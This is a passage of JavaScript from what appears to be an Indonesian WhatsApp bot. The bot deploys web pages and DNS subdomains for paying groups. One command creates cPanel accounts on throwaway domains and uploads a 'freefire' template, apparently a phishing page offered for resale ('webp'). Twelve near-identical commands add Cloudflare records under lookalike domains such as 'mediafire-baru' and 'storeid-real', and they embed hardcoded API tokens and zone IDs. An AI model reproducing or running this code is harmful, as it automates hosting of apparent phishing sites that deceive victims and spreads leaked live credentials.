        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "bcatarif" + makeid(7) + "." + "yosokafomous.ga"


        namamu = mek.pushName
        idmu = mek.key.participant
        m.reply("_Sedang Membuat !!! Harap Tunggu Ya kontoll sekitar 2 menit_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii.yosokafomous.cf/apiiyos/bcatarif/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                m.reply("Wait, Currently creating a domain on yo's server")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "freefire",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii.yosokafomous.cf/apiiyos/bcatarif/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        m.reply("*_DONE ✓_* _Data telah di kirim ke beranda kamu...MHN janggan spam!!_")
                    }


                    MEYBotz.sendText(`${sender}`, `*『 LIST DOMAIN 』*\n┏━━━━━━━━━━━━━━━━━━━\n┣ *Web* : ${pendek}\n┗━━━━━━━━━━━━━━━━━━━\n┣ *Setting* : http://${domain}/vhsfhqpdhdsih6/yosoka.php\n┗━━━━━━━━━━━━━━━━━━━\n┣ nNOTE:\n *dilarang jual webp di bawah 10k atau akan saya benned*\n*Tunggu 5 menit biar gak eror*\n┗━━━━━━━━━━━━━━━━━━━`, m) 
    m.reply(`_Pesan terkirim di chat anda_`)
                })
            } else {
                m.reply("*_Waitt...Lagi masa update bot ke Versi 0.9._*") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break
case 'pasangsmtp': case 'createakun': case 'termintallpackage': case 'addpack':
case 'web p': case 'webp1':
m.reply(`Mohon Maff Fitur Sedang masa update terimakasih....`)
break
case 'domain': case 'domain1':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone1 = "36c04c81a74427d3303cb0111bb0cb8a";
            let apiToken1 = "vdSRK88vszKf6kawueEbw6Y6GJdqcHKc6ylplULI";
            let tld1 = "storeid-real.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone1}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld1, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken1,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
        }else{
            m.reply("MINIMAL NYEWA MASS :V JAN NYULIK KETIK owner*")
    }
        break
case 'domain2':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain2(host, ip) {
          return new Promise((resolve2) => {
            let zone2 = "55e05650e710ef91eea99084ea0c8089";
            let apiToken2 = "9oszKZ6zt2orHw7z1d0LttN_h3gm49x2QBn4hj0n";
            let tld2 = "mxg.my.id"
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone2}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld2, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken2,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve2({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err2 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err2Str = String(err2);
                resolve2({ success: false, error: err2Str });
              });
          });
        }

        let raw2 = args?.join(" ")?.trim();
        if (!raw2) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host2 = raw2
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host2) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip2 = raw2.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip2 || ip2.split(".").length < 4) return m.reply(ip2 ? "ip tidak valid" : "mana ip nya");

        subDomain2(host2, ip2).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break                           
            case 'domain3':
            id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain3(host, ip) {
          return new Promise((resolve3) => {
            let zone3 = "56afaa6194baa860db433926aa9a1b72";
            let apiToken3 = "ErZy-xlvfUXcWnWW4mG6vV2A1E1MrC_8nU67Vazn";
            let tld3 = "v1-baru.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone3}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld3, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken3,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve3({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err3 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err3Str = String(err3);
                resolve3({ success: false, error: err3Str });
              });
          });
        }

        let raw3 = args?.join(" ")?.trim();
        if (!raw3) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host3 = raw3
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host3) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip3 = raw3.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip3 || ip3.split(".").length < 4) return m.reply(ip3 ? "ip tidak valid" : "mana ip nya");

        subDomain3(host3, ip3).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
        case 'domain4':
        id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain4(host, ip) {
          return new Promise((resolve4) => {
            let zone4 = "865b5e17eacfac3da4e65ac6dde6a7fd";
            let apiToken4 = "yIiba4WkAqRTsGL8HRbfUnAnLXI85pYChhtFCkPO";
            let tld4 = "new-v2.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone4}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld4, content: ip.replace(/[^0-9.]/gi, ""), ttl: 4600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken4,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve4({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err4 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err4Str = String(err4);
                resolve4({ success: false, error: err4Str });
              });
          });
        }

        let raw4 = args?.join(" ")?.trim();
        if (!raw4) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host4 = raw4
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host4) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip4 = raw4.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip4 || ip4.split(".").length < 4) return m.reply(ip4 ? "ip tidak valid" : "mana ip nya");

        subDomain4(host4, ip4).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
        case 'domain5':
        id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain5(host, ip) {
          return new Promise((resolve5) => {
            let zone5 = "63cfb48162565e63fe0be5c7fb30dc64";
            let apiToken5 = "zEaUUTw_Y3Msj3rEGB7jh3OF-l2_kNBheG7ziZHk";
            let tld5 = "new-v2.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone5}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld5, content: ip.replace(/[^0-9.]/gi, ""), ttl: 5600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken5,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve5({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err5 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err5Str = String(err5);
                resolve5({ success: false, error: err5Str });
              });
          });
        }

        let raw5 = args?.join(" ")?.trim();
        if (!raw5) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host5 = raw5
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host5) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip5 = raw5.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip5 || ip5.split(".").length < 4) return m.reply(ip5 ? "ip tidak valid" : "mana ip nya");

        subDomain5(host5, ip5).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
        case 'domain6':
        id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain6(host, ip) {
          return new Promise((resolve6) => {
            let zone6 = "67e7997217f6bced193fe6f9b14472bc";
            let apiToken6 = "_9uH7Gc2yi1922_eXm3L3895FruRX2PYam-jF1hG";
            let tld6 = "mrclnotwibu.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone6}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld6, content: ip.replace(/[^0-9.]/gi, ""), ttl: 6600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken6,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve6({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err6 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err6Str = String(err6);
                resolve6({ success: false, error: err6Str });
              });
          });
        }

        let raw6 = args?.join(" ")?.trim();
        if (!raw6) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host6 = raw6
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host6) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip6 = raw6.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip6 || ip6.split(".").length < 4) return m.reply(ip6 ? "ip tidak valid" : "mana ip nya");

        subDomain6(host6, ip6).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
        case 'domain7':
        id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain7(host, ip) {
          return new Promise((resolve7) => {
            let zone7 = "e916682a360719fb705f52f346a6d52a";
            let apiToken7 = "iufothQSD4h2k1KBHw77w5lMsmChliK0SyCDS1im";
            let tld7 = "v1-net-id.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone7}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld7, content: ip.replace(/[^0-9.]/gi, ""), ttl: 7700, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken7,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve7({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err7 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err7Str = String(err7);
                resolve7({ success: false, error: err7Str });
              });
          });
        }

        let raw7 = args?.join(" ")?.trim();
        if (!raw7) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host7 = raw7
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host7) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip7 = raw7.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip7 || ip7.split(".").length < 4) return m.reply(ip7 ? "ip tidak valid" : "mana ip nya");

        subDomain7(host7, ip7).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
case 'domain8':
        id = mek.key.remoteJid
        if(validGrup(id,grups)){
        function subDomain8(host, ip) {
          return new Promise((resolve8) => {
            let zone8 = "e916682a360719fb705f52f346a6d52a";
            let apiToken8 = "iufothQSD4h2k1KBHw77w5lMsmChliK0SyCDS1im";
            let tld8 = "v1-net-id.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone8}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld8, content: ip.replace(/[^0-9.]/gi, ""), ttl: 8800, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken8,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve8({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err8 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err8Str = String(err8);
                resolve8({ success: false, error: err8Str });
              });
          });
        }

        let raw8 = args?.join(" ")?.trim();
        if (!raw8) return m.reply("𝙼𝙰𝙽𝙰 𝙷𝙾𝚂𝚃 & 𝙸𝙿 𝙽𝚈𝙰 𝙾𝙾𝙼 :𝚅 ?");
        let host8 = raw8
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host8) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip8 = raw8.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip8 || ip8.split(".").length < 4) return m.reply(ip8 ? "ip tidak valid" : "mana ip nya");

        subDomain8(host8, ip8).then((e) => {
          if (e['success']) m.reply(`𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙼𝙰𝙽 𝚂𝚄𝙱𝙳𝙾𝙼𝙰𝙸𝙽\n𝙸𝙿 : ${e['ip']}\n𝙳𝙾𝙼𝙰𝙸𝙽 𝙽𝚈𝙰 𝚈𝙰 𝚂𝙰𝚃: ${e['name']}\n\nTELAH TERDAFTAR DI ${groupMetadata.subject}`);
          else m.reply(`𝙶𝙰𝙶𝙰𝙻 ? 𝙹𝙻𝚂 𝙻𝚄 𝙶𝙰𝙺 𝙶𝙰𝙽𝚃𝙴𝙽𝙶\nMsg: ${e['error']}`)
        });
                }else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
        break
//=================================================//
case 'domain9':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain9(host, ip) {
return new Promise((resolve9) => {
let zone9 = "a899f4be92a506fe1ea26dbf23df3a3c";
let apiToken9 = "lmjgDWhTY7Q4-URmSEg7qHLocHFYAr4KOQRZbtOS";
let tld9 = "websiteku2022.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone9}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld9, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken9,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve9({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err9 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err9Str = String(err9);
resolve9({ success: false, error: err9Str });
});
});
}

let raw9 = args?.join(" ")?.trim();
if (!raw9) return m.reply("Enter Name & IP");
let host9 = raw9
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host9) return m.reply("Name Fail");
let ip9 = raw9.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip9 || ip9.split(".").length < 4) return m.reply(ip9 ? "IP Fail" : "Enter IP");

subDomain9(host9, ip9).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break 
//=================================================//                          
case 'domain10':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain10(host, ip) {
return new Promise((resolve10) => {
let zone10 = "f63d901120fd57352cbce87ccb48c11c";
let apiToken10 = "6KBcVM6Y5onoEjHrEsu-tHRgNH9HRaH1YxxvyNuZ";
let tld10 = "mystoreku.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone10}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld10, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken10,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve10({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err10 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err10Str = String(err10);
resolve10({ success: false, error: err10Str });
});
});
}

let raw10 = args?.join(" ")?.trim();
if (!raw10) return m.reply("Enter Name & IP");
let host10 = raw10
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host10) return m.reply("Name Fail");
let ip10 = raw10.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip10 || ip10.split(".").length < 4) return m.reply(ip10 ? "IP Fail" : "Enter IP");

subDomain10(host10, ip10).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
//=================================================//
case 'domain11':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain11(host, ip) {
return new Promise((resolve11) => {
let zone11 = "3bd37b18e4876b17ada05c4e18f75086";
let apiToken11 = "RUhIlc20h2ghf2B6BDriECTq3Qg7Qo9GbYJ_44eC";
let tld11 = "xzproject.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone11}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld11, content: ip.replace(/[^0-9.]/gi, ""), ttl: 11600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken11,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve11({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err11 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err11Str = String(err11);
resolve11({ success: false, error: err11Str });
});
});
}

let raw11 = args?.join(" ")?.trim();
if (!raw11) return m.reply("Enter Name & IP");
let host11 = raw11
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host11) return m.reply("Name Fail");
let ip11 = raw11.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip11 || ip11.split(".").length < 4) return m.reply(ip11 ? "IP Fail" : "Enter IP");

subDomain11(host11, ip11).then((e) => {
if (e['success']) m.reply(`Success Add New Subdomain\nIP : ${e['ip']}\nSubdomain : ${e['name']}\n\nRegister To ${groupMetadata.subject}`);
else m.reply(`Fail Create Subdomain\nMsg: ${e['error']}`)
});
}else{
            m.reply("*『 MINIMAL NYEWA LAH YA !! CUMAN 35K  』*")
        }
break
case 'domain12':
id = mek.key.remoteJid
        if(validGrup(id,grups)){
function subDomain12(host, ip) {
return new Promise((resolve12) => {
let zone12 = "9f84848592cd53964cab6d41b7c5ed30";
let apiToken12 = "J055vr4hasJVX3K3iM8LL_spKB1KwTyXWfgMWJ_j";
let tld12 = "mediafire-baru.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone12}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld12, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
{
headers: {
Authorization: "Bearer " + apiToken12,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve12({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err12 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err12Str = String(err12);
resolve12({ success: false, error: err12Str });
});
});
}

let raw12 = args?.join(" ")?.trim();
if (!raw12) return m.reply("Enter Name & IP");
let host12 = raw12
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host12) return m.reply("Name Fail");
let ip12 = raw12.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip12 || ip12.split(".").length < 4) return m.reply(ip12 ? "IP Fail" : "Enter IP");

subDomain12(host12, ip12).then((e) => {
